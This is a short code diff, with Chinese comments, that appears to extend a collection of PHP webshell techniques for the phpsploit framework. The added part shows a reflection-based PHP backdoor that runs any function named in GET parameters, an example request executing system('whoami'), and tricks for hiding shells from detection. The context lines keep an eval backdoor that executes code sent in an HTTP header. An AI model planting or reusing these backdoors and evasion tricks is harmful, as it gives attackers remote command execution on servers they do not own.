@@ -45,9 +45,20 @@ extract(update($_REQUEST["c"]));
 2.使用php扩展
 https://github.com/phith0n/arbitrary-php-extension
 
+
+3.使用反射
+<?php
+class test extends ReflectionFunction {}
+$f = new test($_GET['c']);
+$f->invoke($_GET['m']);
+https://xxxxx.com/1.php?c=assert&m=system('whoami');
+
+
+所有shell都可以使用use function a as b，或者添加0x00-0x20
+<script language="php"></script> php7后移除
 */
 """
 
-//phpsploit 主要通过eval执行代码方式，这个backdoor是执行head中phpcode，然后header会执行post过来真正要执行操作的phpcode
+//phpsploit 主要通过eval/assert执行代码方式，这个backdoor是执行head中phpcode，然后header会执行post过来真正要执行操作的phpcode
 def default_value():
     return("@eval($_SERVER['HTTP_%%PASSKEY%%']);")
